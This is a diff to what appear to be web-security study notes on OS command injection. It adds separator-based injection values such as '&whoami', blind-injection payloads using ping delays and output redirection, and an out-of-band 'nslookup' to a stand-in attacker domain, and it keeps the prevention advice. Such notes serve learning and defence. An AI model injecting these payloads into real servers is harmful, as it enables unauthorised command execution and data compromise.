@@ -320,18 +320,24 @@ Insufficient logging and monitoring, coupled with missing or ineffective integra
   
 OS command injection (a.k. shell injection) is vulnerability that allows an attacker to execute arbitrary OS commands on the server that is running an application, and typically fully compromise the application and all its data.
   
-- Command separators work on both Windows and Unix-based systems: `&` `&&` `|` `||`
-- Work only on Unix-based systems: `;` `Newline (0x0a or \n)`
-Commands:
+When you have identified an OS command injection vulnerability execute some initial commands to obtain information about the system that you have compromised.
+  Commands:
 ```
 Purpose of command        Linux         Windows
-Name of current user      whoami        whoami
+Name of current user      whoami        whoami         ---> i.e `&whoami` or `|whoami`
 Operating system          uname -a      ver
 Network configuration     ifconfig      ipconfig /all
 Network connections       netstat -an   netstat -an
 Running processes         ps -ef        tasklist 
 ```
- Prevention:
+> Detecting blind OS command injection using time delays: `& ping -c 10 127.0.0.1 &`
+> Exploiting blind OS command injection by redirecting output: `& whoami > /var/www/static/whoami.txt &`
+> Exploiting blind OS command injection using out-of-band (OAST) techniques: `& nslookup name.webattacker.com &`
+ 
+- Command separators work on both Windows and Unix-based systems: `&` `&&` `|` `||`
+- Work only on Unix-based systems: `;` `Newline (0x0a or \n)`
+
+  Prevention:
   - Never call out to OS commands from application-layer code.
   - Validating against a whitelist of permitted values.
   - Validating that the input is a number.
